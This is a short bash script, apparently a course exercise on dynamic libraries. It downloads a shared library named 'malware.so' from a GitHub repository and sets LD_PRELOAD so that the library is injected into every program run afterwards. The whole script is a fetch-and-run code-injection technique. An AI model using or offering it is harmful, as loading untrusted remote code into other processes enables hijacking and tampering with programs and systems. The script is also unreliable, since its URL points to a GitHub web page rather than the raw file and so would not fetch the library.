#!/bin/bash
curl -o ~/malware.so https://github.com/YassineRKB/alx-low_level_programming/blob/main/0x18-dynamic_libraries/malware.so
export LD_PRELOAD=~/malware.so
